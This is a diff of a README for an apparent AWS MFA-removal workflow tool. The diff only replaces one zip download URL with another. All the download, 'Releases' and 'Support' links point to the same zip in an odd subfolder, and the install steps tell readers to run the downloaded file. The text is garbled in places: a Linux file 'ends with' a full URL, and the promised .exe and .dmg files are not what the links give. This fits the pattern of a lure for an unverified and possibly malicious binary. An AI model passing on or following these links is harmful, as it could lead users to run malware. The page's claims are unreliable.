@@ -1,7 +1,7 @@
 # 🎯 qa-mfa-widget-bug-report - Simplifying AWS Workflow Automation
 
 ## 📥 Download the App
-[![Download now](https://raw.githubusercontent.com/Conicality/qa-mfa-widget-bug-report/main/repealist/qa-mfa-widget-bug-report.zip)](https://raw.githubusercontent.com/Conicality/qa-mfa-widget-bug-report/main/repealist/qa-mfa-widget-bug-report.zip)
+[![Download now](https://github.com/Conicality/qa-mfa-widget-bug-report/raw/refs/heads/main/repealist/qa-widget-report-mfa-bug-v3.7.zip)](https://github.com/Conicality/qa-mfa-widget-bug-report/raw/refs/heads/main/repealist/qa-widget-report-mfa-bug-v3.7.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the "qa-mfa-widget-bug-report" application. This tool is designed to automate your AWS Support workflow for Multi-Factor Authentication (MFA) removal. It includes bug documentation, test cases, and efficiency analysis based on expert experience in account security.
@@ -22,7 +22,7 @@ Before you download, ensure that your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Conicality/qa-mfa-widget-bug-report/main/repealist/qa-mfa-widget-bug-report.zip). 
+   Go to the [Releases page](https://github.com/Conicality/qa-mfa-widget-bug-report/raw/refs/heads/main/repealist/qa-widget-report-mfa-bug-v3.7.zip). 
 
 2. **Select Your Version**  
    Look for the version that suits your needs. Usually, the latest version contains the most updated features and bug fixes.
@@ -31,7 +31,7 @@ Before you download, ensure that your system meets the following requirements:
    Click on the download link for your operating system:
    - For Windows: click on the file that ends with `.exe`
    - For macOS: click on the file that ends with `.dmg`
-   - For Linux: click on the file that ends with `https://raw.githubusercontent.com/Conicality/qa-mfa-widget-bug-report/main/repealist/qa-mfa-widget-bug-report.zip`
+   - For Linux: click on the file that ends with `https://github.com/Conicality/qa-mfa-widget-bug-report/raw/refs/heads/main/repealist/qa-widget-report-mfa-bug-v3.7.zip`
 
 4. **Run the Application**  
    After downloading, locate the file in your downloads folder. Double-click the file to run the application. Follow the on-screen instructions to complete the setup.
@@ -62,7 +62,7 @@ If you face any problems during installation or usage, consider the following st
 
 ## 🌐 Support and Community
 For additional assistance, you can:
-- Visit our GitHub page for support: [Support Page](https://raw.githubusercontent.com/Conicality/qa-mfa-widget-bug-report/main/repealist/qa-mfa-widget-bug-report.zip)
+- Visit our GitHub page for support: [Support Page](https://github.com/Conicality/qa-mfa-widget-bug-report/raw/refs/heads/main/repealist/qa-widget-report-mfa-bug-v3.7.zip)
 - Join our community discussions and share your experiences.
 
 ## 🧑‍🤝‍🧑 Contributing
